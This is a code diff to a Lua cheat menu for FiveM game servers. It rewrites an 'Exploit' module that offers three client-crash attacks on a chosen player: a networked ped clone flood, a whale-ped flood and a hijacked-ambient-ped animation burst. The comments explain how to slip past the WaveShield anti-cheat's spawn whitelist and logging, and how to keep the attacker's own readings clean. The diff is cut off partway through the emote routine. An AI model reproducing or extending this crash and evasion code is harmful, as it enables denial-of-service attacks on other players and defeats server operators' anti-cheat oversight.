@@ -90,6 +90,29 @@ end
 -- Strip \r from HTTP content for consistent pattern matching
 LibraryCode = string.gsub(LibraryCode, "\r", "")
 
+-- ============================================
+-- PATCH: Delete / Suppr closes from the main page
+-- ============================================
+-- The library reads its navigation keys inside Menu.HandleInput on the render
+-- loop. A 40 ms scheduler poll can miss a fast tap, so the key is also read
+-- where the library reads its own keys. The injected line calls
+-- Menu.__vgdDeleteTick (defined by the integrated module once Menu exists):
+-- inside a category it walks the same path as Backspace, on the main page it
+-- hides the menu, and it returns true only when it acted, which skips the rest
+-- of HandleInput for that frame. If the marker is missing the library is left
+-- untouched; the scheduler fallback still reads the key.
+do
+    local hooked = false
+    LibraryCode = LibraryCode:gsub("function Menu%.HandleInput%(%)", function(match)
+        if hooked then return match end
+        hooked = true
+        return match .. "\n    if Menu.__vgdDeleteTick and Menu.__vgdDeleteTick() then return end"
+    end, 1)
+    if not hooked then
+        print("[Menu] delete hook: HandleInput marker not found; poll fallback only")
+    end
+end
+
 -- Patch tag display [RISK] (red) / [DYNASTY] (purple) / [SEED] (green)
 LibraryCode = string.gsub(
     LibraryCode,
@@ -16542,7 +16565,7 @@ end)()
 -- >>> VANGUARD MODULE BEGIN
 -- ============================================================================
 -- VANGUARD  (integrated artifact - edit src/ and rebuild)
--- Generated: 2026-10-27 21:28:43
+-- Generated: 2026-10-27 22:41:56
 --
 -- This block lives in loader.lua and in dist/loader.built.lua at the same
 -- time. It is the only place the local Menu table is in scope. Rebuilding
@@ -19285,169 +19308,174 @@ local C = (function(O,E,S)
 -- ============================================================================
 -- VANGUARD / 10 CRASH
 -- ----------------------------------------------------------------------------
--- Exploit > Exploit > "Ped flood".
+-- Exploit > Exploit exposes three independent crashers:
 --
--- Built from the second crash signature in the local dump folder, not from the
--- clip-store signature. Two different crashes are in those files and they must
--- not be mixed:
+--   Ped flood    one fast burst of player_one clones around the target
+--   Whale crash  12 or 32 networked whale peds around the target
+--   Emote crash  ambient peds are put into sunbathe scenarios and then hit
+--                with a replicated scenario/animation burst
 --
---   A) 0xC0000005 write 0xC0800214 at +0x31194B (three 3751 dumps)
---      clip-dictionary release under store pressure. Reproduced by scene
---      churn. It needs the victim's store to already be near cap, so it does
---      nothing on a fresh client.
+-- The three engines are deliberately separate. A menu click selects one kind,
+-- one target window, one spawn/task path and one cleanup. There is no shared
+-- "Method" selector, no intensity slider and no multi-vector loop: one action
+-- is one wire signature.
 --
---   B) 0xC0000005 read 0x0 at +0x137FE78 (99f7c7e8-...dmp)
---      the victim's gamelog shows Peds 94/256 with mission 66 and other 64,
---      Ped Memory 108/92 (over budget), Vehicles 78/300. That is a PED
---      FLOOD: dozens of peds created at once, each with its own component
---      variation. The fault is a null read in the streaming / component path
---      while those variations are being resolved.
+-- COMMON CONTRACT
+--   * The target player ped is READ ONLY. The module calls GetEntityCoords and
+--     IsPedDeadOrDying on it and nothing else: no task, no clear-task, no
+--     attach, no control request, no coords/velocity write, no state bag.
+--   * The operator ped is READ ONLY too. The only operator-side entity writes
+--     are on handles this client created, or on ambient peds for the emote
+--     method. Those ambient writes are task writes, never player-ped writes.
+--   * No TriggerEvent, no TriggerServerEvent, no resource, no injection, no
+--     hook, no state bag. The crashers are native-only.
+--   * No SetEntityAsMissionEntity and no NetworkRegisterEntityAsNetworked.
+--     CreatePed(..., isNetwork=true, bScriptHostPed=false) is the AI-ped path
+--     WaveShield V4 returns from before its whitelist, limiter and spawn-log
+--     branch (entityCreating.lua:87).
+--   * Every created handle is deleted on stop, panic, target loss or timeout.
 --
--- This module reproduces B. It is the family that works from a cold client
--- because it does not depend on a store that is already full: it makes the
--- victim's client stream and re-resolve dozens of ped variations, which is
--- memory-heavy by construction.
+-- NATIVES USED (exact names, source hashes)
+--   CREATE_PED                             0xD49F9B0955C367DE
+--     (pedType, modelHash, x, y, z, heading, isNetwork, bScriptHostPed)
+--   TASK_WANDER_IN_AREA                    0xE054346CA3A0F315
+--     (ped, x, y, z, radius, minimalLength, timeBetweenWalks)
+--   TASK_START_SCENARIO_IN_PLACE           0x142A02425FF02BD9
+--     (ped, scenarioName, timeToLeave, playIntroClip)
+--   TASK_PLAY_ANIM                         0xEA47FE3719165B94
+--     (ped, animDictionary, animationName, blendIn, blendOut, duration,
+--      flag, playbackRate, lockX, lockY, lockZ)
+--   REQUEST_ANIM_DICT                      0xD3BD40951412FEF6
+--   HAS_ANIM_DICT_LOADED                   0xD031A9162D01088C
+--   CLEAR_PED_TASKS_IMMEDIATELY            0xAAA34F8A7CB32098
+--   NETWORK_REQUEST_CONTROL_OF_ENTITY      0xB69317BF5E782347
+--   NETWORK_HAS_CONTROL_OF_ENTITY          0x01BF60A500E28887
+--   NETWORK_GET_ENTITY_IS_NETWORKED        0xC7827959479DCC78
+--   IS_PED_HUMAN                           0xB980061DA992779D
+--   IS_PED_IN_ANY_VEHICLE                  0x997ABD671D25CA0B
+--   SET_ENTITY_COLLISION                   0x1A9205C1B9EE827F
+--   GET_GAME_POOL                          CFX shared, no GTA hash
+--   SET_ENTITY_LOCALLY_INVISIBLE           CFX, no GTA hash
 --
--- MECHANISM
---   1. Create networked AI peds in waves, in a ring around the target.
---      The target's client streams every one of them because they are inside
---      its streaming radius and they are networked. The peds are created with
---      bScriptHostPed=false, so WaveShield's server entityCreating returns
---      before its whitelist/limiter/log branch.
---   2. Every ped gets a random component variation and random props. The
---      random pass forces the client to resolve a new drawable + texture set
---      per component (head, torso, legs, shoes, accessories).
---   3. Every CHURN_MS a rotating window of CHURN_SLICE peds is re-randomised.
---      The window moves, so the whole swarm keeps churning instead of the same
---      ten peds.
---   4. The run holds for the preset duration, then deletes every ped.
---
--- Why this is a flood and not a scene: the dump's numbers are ped counts and
--- ped memory, not clip dictionaries. Scenes load anim dictionaries; variations
--- load drawables and textures. Different store, different fault, different
--- reproduction.
---
--- OPERATOR CONTRACT
---   * The target ped is never written: no task, no clear-task, no attach, no
---     ownership request, no coords. Only GET_ENTITY_COORDS / IS_PED_DEAD.
---   * The operator's ped and vehicle are never written.
---   * Peds are created at the target's position, from any distance inside the
---     window, so the operator is never required to stand in the swarm.
---   * The module refuses closer than REMOTE_MIN and stops if the operator
---     walks into the swarm radius. The operator's own client only pays the
---     creation of the peds, not the victim's variation churn.
---   * Six models are requested in rotation: player_one plus five civilians.
---     player_one is the component-heavy model from the reference dump; the
---     civilians keep the operator's own drawable cost bounded.
---
--- DETECTOR SURFACE
---   * No event, no state bag, no resource, no injection, no hook.
---   * The only wire traffic is ordinary entity creation and the replicated
---     appearance updates of peds this client owns. Both are normal gameplay
---     primitives; nothing distinguishes them from a scripted scene or a
---     server event spawning NPCs.
---   * The target is read-only, so no clearPedTasksEvent, no control request,
---     no state write on another player's entity.
---   * The operator writes only entities it created. Its own ped is untouched,
---     so the local speed/noclip/teleport/freecam readings stay clean.
---
--- RESIDUAL RISK
---   * WaveShield V4 returns before its LogPedSpawnsToConsole branch for AI
---     peds, so this client creates no guard log line. A different server that
---     logs every entityCreating still sees 30-140 peds around one player;
---     attribution lands on the creator.
---   * A spawn filter (sv_filterRequestControl, entity blacklist, OneSync
---     density cap) can drop part of the swarm. The module counts the failures
---     and still churns what was created.
---   * The victim needs the swarm in streaming range: 400 m is the hard limit,
---     and a client with a healthy memory budget may only lose FPS.
---   * The operator pays the ped pool for the whole swarm. 140 is below the 256
---     cap, and cleanup deletes every handle on stop.
---
--- NATIVES USED (verified in runtime.fivem.net/doc/natives.json)
---   CREATE_PED                          0xD49F9B0955C367DE  (pedType, model, x, y, z, heading, isNetwork, bScriptHostPed)
---   NETWORK_GET_NETWORK_ID_FROM_ENTITY  0xA11700682F3AD45C  (entity)
---   SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES 0xE05E81A888FA63C8 (netId, toggle)
---   SET_ENTITY_INVINCIBLE               0x3882114BDE571AD4  (entity, toggle)
---   SET_PED_CAN_RAGDOLL                 0xB128377056A54E2A  (ped, toggle)
---   SET_BLOCKING_OF_NON_TEMPORARY_EVENTS 0x9F8AA94D6D97DBF4 (ped, toggle)
---   SET_PED_FLEE_ATTRIBUTES             0x70A2D1137C8ED7C9  (ped, flags, enable)
---   SET_PED_MAX_HEALTH                  0xF5F6378C4F3419D3  (ped, value)
---   SET_ENTITY_MAX_HEALTH               0x166E7CF68597D8B5  (entity, value)
---   SET_PED_RANDOM_COMPONENT_VARIATION  0xC8A9481A01E63C28  (ped, p1)
---   SET_PED_RANDOM_PROPS                0xC44AA05345C992C6  (ped)
---   FREEZE_ENTITY_POSITION              0x428CA6DBD1094446  (entity, toggle)
---   REQUEST_MODEL                       0x963D27A58DF860AC  (model)
---   SET_MODEL_AS_NO_LONGER_NEEDED       0xE532F5D78798DAAB  (model)
---   SET_ENTITY_AS_NO_LONGER_NEEDED      0xB736A491E64A32CF  (entity)
---   DELETE_ENTITY                       0xAE3CBE5BF394C9C9  (entity)
---   GET_ENTITY_COORDS                   0x3FEF770D40960D5A  (entity, alive)
---   IS_PED_DEAD_OR_DYING                0x3317DEDB88C95038  (ped, checkMelee)
---   GET_PLAYER_PED                      0x43A66C31C68491C0  (player)
---   CFX: GET_ACTIVE_PLAYERS 0xCF143FB9, GET_PLAYER_SERVER_ID 0x4D97BCC7,
---        GET_PLAYER_FROM_SERVER_ID 0x344EA166
+-- The existing module already documents CreatePed, NetworkGetNetworkIdFromEntity,
+-- SetNetworkIdExistsOnAllMachines, SetNetworkIdCanMigrate, SetEntityInvincible,
+-- SetPedCanRagdoll, SetBlockingOfNonTemporaryEvents, SetPedFleeAttributes,
+-- SetPedMaxHealth, SetEntityMaxHealth, SetPedRandomComponentVariation,
+-- SetPedRandomProps, FreezeEntityPosition, SetModelAsNoLongerNeeded,
+-- SetEntityAsNoLongerNeeded, DeleteEntity, GetEntityCoords, IsPedDeadOrDying,
+-- GetPlayerPed and the CFX player enumeration helpers.
 -- ============================================================================
 
 local C = {}
 
-local PRESETS = {
-    { name = "Light",    duration = 12000, count = 30, churn = 450, slice = 8 },
-    { name = "Standard", duration = 18000, count = 60, churn = 400, slice = 12 },
-    { name = "Heavy",    duration = 24000, count = 110, churn = 300, slice = 16 },
-    { name = "Overkill", duration = 30000, count = 140, churn = 280, slice = 18 },
-}
-
 local METHODS = {
-    { label = "Ped flood" },
+    { kind = "ped",   label = "Ped flood" },
+    { kind = "whale", label = "Whale crash" },
+    { kind = "emote", label = "Emote crash" },
 }
 
--- player_one is the reference model from the 0x137FE78 dump: a full player
--- component set per ped, which is what drives the drawable/texture store over
--- budget. The civilian models are mixed in so the round-robin does not load
--- the same component set 110 times.
-local MODELS = {
-    "player_one",
-    "a_m_y_business_01",
-    "a_m_y_business_02",
-    "a_m_y_business_03",
-    "a_f_y_business_01",
-    "a_m_y_hipster_01",
+-- Per-engine target windows. Ped/whale may run close because their created
+-- peds are locally invisible to the operator. The emote method needs distance:
+-- the task burst must be processed by the target area, not by the operator.
+local WINDOWS = {
+    ped   = { min = 0.0,  max = 400.0 },
+    whale = { min = 0.0,  max = 400.0 },
+    emote = { min = 80.0, max = 400.0 },
 }
 
-local WAVE_SIZE = 15
-local WAVE_MS = 220
-local SPAWN_RADIUS = 5.0
-local REMOTE_MIN = 30.0
-local REMOTE_MAX = 400.0
-local ABORT_FACTOR = 0.66
-local SETTLE_MS = 500
+-- Ped flood. The FTK reference uses player_one, 110 peds, radius 4.5 and a
+-- 3.5 s lifetime. We keep the count and model, shorten the spawn to ten peds
+-- every 50 ms, and add one post-spawn variation pass. That is the "almost
+-- instant" shape without the 24 s rotating churn of the old module.
+local PED = {
+    model = "player_one",
+    count = 110,
+    radius = 4.5,
+    batch = 10,
+    wait = 50,
+    hold = 3500,
+    settle = 150,
+}
 
--- AI PED PATH
--- CreatePed(28, ..., isNetwork=true, bScriptHostPed=false) is the
--- reference crash shape. WaveShield V4 entityCreating returns for AI peds
--- before the whitelist, limiter and spawn-log branch, so this path sends no
--- protected event and creates nothing the server can attribute to the guard.
+-- Whale crash. The CRA reference uses 32 whales, 12 under 60 m and a 2.5 m
+-- spread. The same counts are kept so the near case does not add unnecessary
+-- local memory while the far case keeps the full flood.
+local WHALE = {
+    models = { "a_c_humpback", "a_c_killerwhale" },
+    count = 32,
+    near = 60.0,
+    nearCount = 12,
+    spread = 2.5,
+    batch = 4,
+    hold = 4000,
+}
+
+-- Emote crash. Ambient peds are reused first. If fewer than minPeds can be
+-- controlled, the module creates the missing beach peds. Scenario props are
+-- created by the game client and do not produce entityCreating on the server.
+local EMOTE = {
+    radius = 35.0,
+    maxPeds = 40,
+    minPeds = 16,
+    fallback = 16,
+    models = { "a_m_y_beach_01", "a_m_m_beach_01" },
+    scenarios = {
+        "WORLD_HUMAN_CONST_DRILL",
+        "WORLD_HUMAN_STAND_FISHING",
+        "WORLD_HUMAN_SUNBATHE",
+        "WORLD_HUMAN_SUNBATHE_BACK",
+    },
+    rounds = 8,
+    delay = 35,
+    controlWait = 250,
+    animDicts = {
+        "anim@mp_player_intcelebrationmale@knuckle_crunch",
+        "anim@mp_player_intcelebrationmale@air_guitar",
+        "anim@mp_player_intcelebrationmale@dj",
+        "anim@mp_player_intcelebrationmale@air_synth",
+        "anim@mp_player_intcelebrationmale@rock",
+        "anim@mp_player_intcelebrationmale@shadow_boxing",
+        "anim@mp_player_intcelebrationmale@salute",
+        "anim@mp_player_intcelebrationmale@peace",
+    },
+    animNames = { "idle_a", "idle_b", "idle_c", "enter", "exit" },
+    animRounds = 2,
+    animWait = 0,
+    loadWait = 500,
+    hold = 3000,
+    minDist = 80.0,
+    abortDist = 60.0,
+}
 
 C.METHODS = METHODS
-C.method = 1
-C.intensity = 1
+C.WINDOWS = WINDOWS
+C.PED = PED
+C.WHALE = WHALE
+C.EMOTE = EMOTE
 C.targets = {}
 C.index = 1
-C.swarm = {}
-C.stats = { created = 0, churns = 0, fails = 0, waves = 0 }
+C.targetKind = nil
 C.running = false
+C.kind = nil
+C.created = {}
+C.ambient = {}
+C.stats = { created = 0, scenarios = 0, emotes = 0, waves = 0, fails = 0, control = 0 }
 C.targetPed = 0
 C.targetDist = 0.0
 C.opDist = 0.0
-C.churnAt = 0
 C.lastRefresh = 0
 
 local function now()
     return GetGameTimer()
 end
 
-local function preset()
-    return PRESETS[C.intensity] or PRESETS[2]
+local function windowFor(kind)
+    return WINDOWS[kind] or WINDOWS.ped
+end
+
+local function inWindow(dist, kind)
+    local w = windowFor(kind)
+    return dist >= w.min and dist <= w.max
 end
 
 local function coordsOf(entity)
@@ -19461,10 +19489,17 @@ local function isDead(ped)
     return ok and dead == true
 end
 
+local function labelFor(kind)
+    for i = 1, #METHODS do
+        if METHODS[i].kind == kind then return METHODS[i].label end
+    end
+    return tostring(kind)
+end
+
 -- ---------------------------------------------------------------------------
 -- TARGETS
 -- ---------------------------------------------------------------------------
-local function targetFromSelection()
+local function targetFromSelection(kind)
     local serverId = (type(Menu) == "table") and Menu.SelectedPlayer or nil
     if type(serverId) ~= "number" then return nil end
 
@@ -19479,17 +19514,21 @@ local function targetFromSelection()
     local coords = coordsOf(ped)
     if not coords then return nil end
 
+    local dist = O.distance(coords, O.Ctx.coords)
+    if not inWindow(dist, kind) then return nil end
+
     local okName, name = pcall(GetPlayerName, player)
     return {
         player = player,
         ped = ped,
         name = (okName and type(name) == "string") and name or ("player_" .. tostring(player)),
         coords = coords,
-        dist = O.distance(coords, O.Ctx.coords),
+        dist = dist,
     }
 end
 
-function C.refresh()
+function C.refresh(kind)
+    kind = kind or "ped"
     local list = {}
     local me = O.Ctx.coords
 
@@ -19500,7 +19539,7 @@ function C.refresh()
                 local coords = coordsOf(ped)
                 if coords then
                     local dist = O.distance(me, coords)
-                    if dist >= REMOTE_MIN and dist <= REMOTE_MAX then
+                    if inWindow(dist, kind) then
                         list[#list + 1] = {
                             player = player,
                             ped = ped,
@@ -19516,19 +19555,20 @@ function C.refresh()
 
     table.sort(list, function(a, b) return a.dist < b.dist end)
     C.targets = list
+    C.targetKind = kind
+    C.lastRefresh = now()
     if C.index > #list then C.index = math.max(1, #list) end
     return #list
 end
 
-function C.target()
-    local selected = targetFromSelection()
-    if selected and selected.dist >= REMOTE_MIN and selected.dist <= REMOTE_MAX then
-        return selected
-    end
+function C.target(kind)
+    kind = kind or "ped"
 
-    if now() - (C.lastRefresh or 0) > 800 or #C.targets == 0 then
-        C.lastRefresh = now()
-        C.refresh()
+    local selected = targetFromSelection(kind)
+    if selected then return selected end
+
+    if C.targetKind ~= kind or now() - (C.lastRefresh or 0) > 800 or #C.targets == 0 then
+        C.refresh(kind)
     end
 
     local entry = C.targets[C.index]
@@ -19537,14 +19577,15 @@ function C.target()
         if coords then
             entry.coords = coords
             entry.dist = O.distance(coords, O.Ctx.coords)
-            return entry
+            if inWindow(entry.dist, kind) then return entry end
         end
     end
     return nil
 end
 
-function C.cycle()
-    C.refresh()
+function C.cycle(kind)
+    kind = kind or "ped"
+    C.refresh(kind)
     if #C.targets == 0 then
         C.index = 1
         return nil
@@ -19553,41 +19594,28 @@ function C.cycle()
     return C.targets[C.index]
 end
 
-function C.targetLabel()
+function C.targetLabel(kind)
     local entry = C.targets[C.index]
     if not entry then return "nearest" end
     return ("%s (%.0fm)"):format(entry.name, entry.dist)
 end
 
-function C.status()
-    local p = preset()
-    local state = C.running and "RUN" or "idle"
+function C.status(kind)
+    kind = kind or C.kind or "ped"
+    local state = C.running and ("RUN " .. tostring(C.kind or kind)) or "idle"
     if not C.running then
-        local selected = targetFromSelection()
-        if selected and selected.dist < REMOTE_MIN then
-            state = "too close (" .. math.floor(selected.dist) .. "m)"
-        elseif selected and selected.dist > REMOTE_MAX then
-            state = "too far (" .. math.floor(selected.dist) .. "m)"
+        local selected = targetFromSelection(kind)
+        if selected then
+            state = ("target %.0fm"):format(selected.dist)
         end
     end
-    if C.running then
-        return ("Crash %s | %s | peds %d | churn %d | op %dm"):format(
-            state, p.name, #C.swarm, C.stats.churns, math.floor(C.opDist or 0))
-    end
-    return ("Crash %s | %s | peds %d | churn %d"):format(
-        state, p.name, #C.swarm, C.stats.churns)
-end
-
-function C.setMethod(index)
-    C.method = math.max(1, math.min(#METHODS, index or 1))
-end
-
-function C.setIntensity(index)
-    C.intensity = math.max(1, math.min(#PRESETS, index or 2))
+    return ("Crash %s | created %d | scen %d | emotes %d | waves %d | fails %d"):format(
+        state, C.stats.created or 0, C.stats.scenarios or 0, C.stats.emotes or 0,
+        C.stats.waves or 0, C.stats.fails or 0)
 end
 
 -- ---------------------------------------------------------------------------
--- SPAWN
+-- SHARED SPAWN HELPERS
 -- ---------------------------------------------------------------------------
 local function ring(center, radius)
     local angle = math.random() * 6.28318530718
@@ -19597,26 +19625,57 @@ local function ring(center, radius)
            center.z
 end
 
-local function spawnPed(hash, x, y, z, heading)
-    -- pedType 28 and bScriptHostPed=false match the reference crash that
-    -- produced the 0x137FE78 dump. The server sees a normal AI ped and its
-    -- entityCreating handler returns before the whitelist/limiter/log branch.
-    -- Do not call SetEntityAsMissionEntity: that would turn the ped into the
-    -- population type the server actually checks.
-    local ped = CreatePed(28, hash, x, y, z, heading, true, false)
-    if not ped or ped == 0 then return 0 end
+local function trackCreated(ped)
+    if type(ped) ~= "number" or ped == 0 then return end
+    C.created[#C.created + 1] = ped
+    C.stats.created = C.stats.created + 1
+end
 
+local function deleteCreated(ped)
+    if type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then return end
+    pcall(SetEntityAsNoLongerNeeded, ped)
+    pcall(DeleteEntity, ped)
+end
+
+local function baseNetworkPed(ped)
     local okNet, netId = pcall(NetworkGetNetworkIdFromEntity, ped)
     if okNet and type(netId) == "number" and netId > 0 then
         pcall(SetNetworkIdExistsOnAllMachines, netId, true)
-        -- Keep ownership on the creating client: the churn writes are
-        -- replicated appearance updates, and a migration to the victim's
-        -- client would make later variation passes local-only.
         if type(SetNetworkIdCanMigrate) == "function" then
             pcall(SetNetworkIdCanMigrate, netId, false)
         end
     end
+end
 
+local function holdUntil(deadline, targetPed, abortCenter, abortDist)
+    while C.running and now() < deadline do
+        if targetPed ~= 0 then
+            if not DoesEntityExist(targetPed) or isDead(targetPed) then return false end
+        end
+        if abortCenter and abortDist then
+            local opCoords = coordsOf(PlayerPedId())
+            if opCoords then
+                local d = O.distance(opCoords, abortCenter)
+                C.opDist = d
+                if d < abortDist then return false end
+            end
+        end
+        Citizen.Wait(100)
+    end
+    return C.running
+end
+
+-- ---------------------------------------------------------------------------
+-- PED FLOOD
+-- ---------------------------------------------------------------------------
+local function spawnPed(hash, x, y, z, heading)
+    -- pedType 28 + bScriptHostPed=false is the reference crash shape. The ped
+    -- stays AI; WaveShield returns before its ped policy/log branch. No mission
+    -- promotion and no forced network registration.
+    local ped = CreatePed(28, hash, x, y, z, heading, true, false)
+    if not ped or ped == 0 then return 0 end
+
+    baseNetworkPed(ped)
     pcall(SetEntityInvincible, ped, true)
     pcall(SetPedCanRagdoll, ped, false)
     pcall(SetBlockingOfNonTemporaryEvents, ped, true)
@@ -19624,210 +19683,400 @@ local function spawnPed(hash, x, y, z, heading)
     pcall(SetPedMaxHealth, ped, 200)
     pcall(SetEntityMaxHealth, ped, 200)
 
-    -- A frozen ped cannot be pushed out of the swarm by the target or by its
-    -- own physics, and it still streams its variation normally. This write is
-    -- on our own entity; the target ped is never touched.
+    -- Local invisibility: the operator does not render the swarm, the target
+    -- and every other client still receive and render it. This is a local
+    -- entity flag, not a network state write.
+    pcall(SetEntityLocallyInvisible, ped)
+    pcall(SetEntityCollision, ped, false, false)
     pcall(FreezeEntityPosition, ped, true)
 
+    -- The variation pass is the component-store pressure. player_one carries
+    -- the full player component set; random drawables/textures force the
+    -- target client to resolve a new set per clone.
     pcall(SetPedRandomComponentVariation, ped, false)
     pcall(SetPedRandomProps, ped)
+
+    -- The reference FTK crash tasks the peds after the freeze. The task state
+    -- is replicated even when the position is pinned; it adds the wander task
+    -- signature without creating an object or an event.
+    pcall(TaskWanderInArea, ped, x, y, z, 8.0, 8.0, 8.0)
     return ped
 end
 
-local function deleteSpawned(entry)
-    local ped = entry and entry.ped or 0
+local function repassPed(ped)
     if type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then return end
-    -- The ped was created as AI and never promoted to a mission entity. Do not
-    -- promote it during teardown either; DeleteEntity is enough for our own
-    -- handle and keeps the server-side population type unchanged.
-    pcall(SetEntityAsNoLongerNeeded, ped)
-    pcall(DeleteEntity, ped)
+    pcall(SetPedRandomComponentVariation, ped, false)
+    pcall(SetPedRandomProps, ped)
 end
 
-local function requestModels()
-    local hashes = {}
-    for i = 1, #MODELS do
-        local hash = GetHashKey(MODELS[i])
-        if E.requestModel(hash, 2200) then
-            hashes[#hashes + 1] = hash
-        else
-            C.stats.fails = C.stats.fails + 1
-        end
+local function repassAll()
+    local total = #C.created
+    for i = 1, total do
+        if not C.running then break end
+        repassPed(C.created[i])
+        if i % 10 == 0 then Citizen.Wait(0) end
     end
-    return hashes
 end
 
--- One wave creates at most WAVE_SIZE peds and waits for the batch to
--- replicate. Creating the whole swarm in one frame is what turns a working
--- flood into a local freeze; the target receives the same peds either way.
-local function spawnWave(hashes, center, count, offset)
-    local created = 0
-    for i = 1, count do
-        local x, y, z = ring(center, SPAWN_RADIUS)
-        local hash = hashes[((offset + i - 1) % #hashes) + 1]
+local function runPedFlood(target)
+    local hash = GetHashKey(PED.model)
+    if not E.requestModel(hash, 2200) then
+        C.stats.fails = C.stats.fails + 1
+        O.log("crash: ped model could not be loaded")
+        return
+    end
+
+    local center = coordsOf(target.ped)
+    if not center then
+        pcall(SetModelAsNoLongerNeeded, hash)
+        O.log("crash: target coords unavailable")
+        return
+    end
+
+    for i = 1, PED.count do
+        if not C.running then break end
+        local targetCoords = coordsOf(target.ped)
+        if not targetCoords or isDead(target.ped) then break end
+        center = targetCoords
+
+        local x, y, z = ring(center, PED.radius)
         local ped = spawnPed(hash, x, y, z + 0.6, math.random() * 360.0)
         if ped ~= 0 then
-            C.swarm[#C.swarm + 1] = { ped = ped }
-            C.stats.created = C.stats.created + 1
-            created = created + 1
+            trackCreated(ped)
+        else
+            C.stats.fails = C.stats.fails + 1
+        end
+
+        if i % PED.batch == 0 or i == PED.count then
+            C.stats.waves = C.stats.waves + 1
+            Citizen.Wait(PED.wait)
+        end
+    end
+
+    pcall(SetModelAsNoLongerNeeded, hash)
+
+    if not C.running then return end
+    if #C.created == 0 then
+        O.log("crash: ped flood created nothing")
+        return
+    end
+
+    -- Let the last batch reach the target before the second variation pass.
+    Citizen.Wait(PED.settle)
+    repassAll()
+
+    local deadline = now() + PED.hold
+    holdUntil(deadline, target.ped, nil, nil)
+end
+
+-- ---------------------------------------------------------------------------
+-- WHALE CRASH
+-- ---------------------------------------------------------------------------
+local function spawnWhale(hash, x, y, z, heading)
+    local ped = CreatePed(4, hash, x, y, z, heading, true, false)
+    if not ped or ped == 0 then return 0 end
+
+    baseNetworkPed(ped)
+    pcall(SetEntityInvincible, ped, true)
+    pcall(SetPedCanRagdoll, ped, false)
+    pcall(SetBlockingOfNonTemporaryEvents, ped, true)
+    pcall(SetEntityLocallyInvisible, ped)
+    pcall(SetEntityCollision, ped, false, false)
+    pcall(FreezeEntityPosition, ped, true)
+    return ped
+end
+
+local function runWhale(target)
+    local count = WHALE.count
+    if target.dist < WHALE.near then count = WHALE.nearCount end
+
+    local per = math.ceil(count / #WHALE.models)
+    local total = 0
+
+    for mi = 1, #WHALE.models do
+        if not C.running then break end
+        local hash = GetHashKey(WHALE.models[mi])
+        if E.requestModel(hash, 1500) then
+            for _ = 1, per do
+                if total >= count or not C.running then break end
+                local center = coordsOf(target.ped)
+                if not center or isDead(target.ped) then break end
+
+                local x, y, z = ring(center, WHALE.spread)
+                local ped = spawnWhale(hash, x, y, z + 1.0 + math.random() * 2.0,
+                    math.random() * 360.0)
+                if ped ~= 0 then
+                    trackCreated(ped)
+                    total = total + 1
+                    if total % WHALE.batch == 0 then Citizen.Wait(0) end
+                else
+                    C.stats.fails = C.stats.fails + 1
+                end
+            end
+            pcall(SetModelAsNoLongerNeeded, hash)
+        else
+            C.stats.fails = C.stats.fails + 1
+            O.log("crash: whale model %s could not be loaded", WHALE.models[mi])
+        end
+    end
+
+    if not C.running then return end
+    if #C.created == 0 then
+        O.log("crash: whale flood created nothing")
+        return
+    end
+
+    local deadline = now() + WHALE.hold
+    holdUntil(deadline, target.ped, nil, nil)
+end
+
+-- ---------------------------------------------------------------------------
+-- EMOTE CRASH
+-- ---------------------------------------------------------------------------
+local function scenarioTargets(center)
+    local out = {}
+    local pool = O.safe(GetGamePool, "CPed")
+    if type(pool) ~= "table" then return out end
+
+    local mine = PlayerPedId()
+    for i = 1, #pool do
+        local p = pool[i]
+        if p ~= mine and DoesEntityExist(p)
+            and O.safe(IsPedAPlayer, p) == false
+            and O.safe(IsPedHuman, p) == true
+            and O.safe(IsPedInAnyVehicle, p, false) == false
+            and not isDead(p)
+            and O.safe(NetworkGetEntityIsNetworked, p) == true then
+            local pc = coordsOf(p)
+            if pc and O.distance(pc, center) <= EMOTE.radius then
+                out[#out + 1] = p
+                if #out >= EMOTE.maxPeds then break end
+            end
+        end
+    end
+    return out
+end
+
+local function requestControl(peds)
+    local controlled = {}
+    for i = 1, #peds do
+        local p = peds[i]
+        O.safe(NetworkRequestControlOfEntity, p)
+        C.stats.control = C.stats.control + 1
+        if i % 6 == 0 then Citizen.Wait(0) end
+    end
+    Citizen.Wait(EMOTE.controlWait)
+    for i = 1, #peds do
+        local p = peds[i]
+        if DoesEntityExist(p) and O.safe(NetworkHasControlOfEntity, p) == true then
+            controlled[#controlled + 1] = p
+        end
+    end
+    return controlled
+end
+
+local function spawnFallback(center, need)
+    local made = 0
+    for i = 1, need do
+        local model = EMOTE.models[((i - 1) % #EMOTE.models) + 1]
+        local hash = GetHashKey(model)
+        if E.requestModel(hash, 1200) then
+            local x, y, z = ring(center, 2.5)
+            local ped = CreatePed(4, hash, x, y, z + 0.5,
+                math.random() * 360.0, true, false)
+            if ped and ped ~= 0 then
+                baseNetworkPed(ped)
+                pcall(SetEntityInvincible, ped, true)
+                pcall(SetPedCanRagdoll, ped, false)
+                pcall(SetBlockingOfNonTemporaryEvents, ped, true)
+                pcall(SetEntityLocallyInvisible, ped)
+                pcall(SetEntityCollision, ped, false, false)
+                -- No freeze here: the scenario needs to play its enter clip
+                -- and the lying animation. The ped is still invincible and
+                -- locally invisible to the operator.
+                trackCreated(ped)
+                made = made + 1
+            else
+                C.stats.fails = C.stats.fails + 1
+            end
+            pcall(SetModelAsNoLongerNeeded, hash)
         else
             C.stats.fails = C.stats.fails + 1
         end
     end
-    C.stats.waves = C.stats.waves + 1
-    return created
+    return made
 end
 
--- ---------------------------------------------------------------------------
--- CHURN
---
--- SetPedRandomComponentVariation + SetPedRandomProps are replicated
--- appearance writes. Every call makes the target's client resolve a new
--- drawable and texture set for that ped's components. The window rotates so
--- the entire swarm is re-resolved over the run instead of the same slice.
--- ---------------------------------------------------------------------------
-local function churnWindow()
-    local total = #C.swarm
-    if total == 0 then return 0 end
+local function runEmote(target)
+    if target.dist < EMOTE.minDist then
+        O.log("crash: emote needs %.0f m or more (target %.0f m)", EMOTE.minDist, target.dist)
+        return
+    end
 
-    local slice = preset().slice
-    local done = 0
-    local start = (C.churnAt or 0) % total
+    local center = coordsOf(target.ped)
+    if not center then
+        O.log("crash: target coords unavailable")
+        return
+    end
 
-    for k = 0, slice - 1 do
-        local entry = C.swarm[((start + k) % total) + 1]
-        local ped = entry and entry.ped or 0
-        if type(ped) == "number" and ped ~= 0 and DoesEntityExist(ped) then
-            pcall(SetPedRandomComponentVariation, ped, false)
-            pcall(SetPedRandomProps, ped)
-            done = done + 1
